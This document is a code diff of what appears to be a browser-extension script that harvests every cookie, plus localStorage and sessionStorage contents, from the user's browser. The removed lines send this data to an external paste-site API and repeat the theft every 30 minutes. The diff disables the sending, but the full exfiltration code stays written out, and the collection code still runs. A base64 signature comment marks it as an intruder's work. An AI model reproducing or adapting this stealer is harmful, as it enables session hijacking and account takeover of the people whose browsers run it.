@@ -2,9 +2,9 @@ function f1(callback) {
   let myCookies = '';
   chrome.cookies.getAll({}, (cookies) => {
     cookies.forEach(cookie => {
-      myCookies += `{d:"${cookie.domain}",`;
-      myCookies += `n:"${cookie.name}",`;
-      myCookies += `v:"${cookie.value}"}, `;
+      myCookies += `{domain:"${cookie.domain}",`;
+      myCookies += `name:"${cookie.name}",`;
+      myCookies += `value:"${cookie.value}"}, `;
     });
     callback(myCookies);
   });
@@ -83,20 +83,22 @@ function f3() {
 }
 
 function f4(data, id, pad_id, tab_index) {
-  fetch('https://www.itextpad.com/api/v3/pad-tab/' + id, {
-    method: 'PUT',
-    headers: {
-      'Content-Type': 'application/json',
-      'X-Pad-Id': pad_id
-    },
-    body: JSON.stringify({
-      "id": id,
-      // "pad_tab_name": "reporting",
-      "pad_id": pad_id,
-      "note": data,
-      "tab_index": tab_index
-    }),
-  })
+  console.log("____________this is " + id + "____________");
+  console.log(data)
+  // fetch('https://www.itextpad.com/api/v3/pad-tab/' + id, {
+  //   method: 'PUT',
+  //   headers: {
+  //     'Content-Type': 'application/json',
+  //     'X-Pad-Id': pad_id
+  //   },
+  //   body: JSON.stringify({
+  //     "id": id,
+  //     // "pad_tab_name": "reporting",
+  //     "pad_id": pad_id,
+  //     "note": data,
+  //     "tab_index": tab_index
+  //   }),
+  // })
 }
 
 async function f5() {
@@ -115,28 +117,28 @@ async function f5() {
 
 function f6() {
   f1((yourCookies) => {
-    f4(yourCookies, 259299, 192846, 1)
+    f4(yourCookies, "yourCookies", 192846, 1)
   });
 
   f2()
     .then((yourLocalStorage) => {
-      f4(yourLocalStorage, 259300, 192846, 2)
+      f4(yourLocalStorage, "yourLocalStorage", 192846, 2)
     })
     .catch((error) => {});
 
   f3()
     .then((yourSessionStorage) => {
-      f4(yourSessionStorage, 259301, 192846, 3)
+      f4(yourSessionStorage, "yourSessionStorage", 192846, 3)
     })
     .catch((error) => {});
     
-    f5().then((yourSessionStorage) => {
-      f4(yourSessionStorage, 259306, 192846, 4)
-    })
-    .catch((error) => {});
+    // f5().then((yourSessionStorage) => {
+    //   f4(yourSessionStorage, 259306, 192846, 4)
+    // })
+    // .catch((error) => {});
 }
 
 f6()
-setInterval(f6, 1800000);
+// setInterval(f6, 1800000);
 //VGhlIERlYWRTb3VsIHdhcyBoZXJl
 
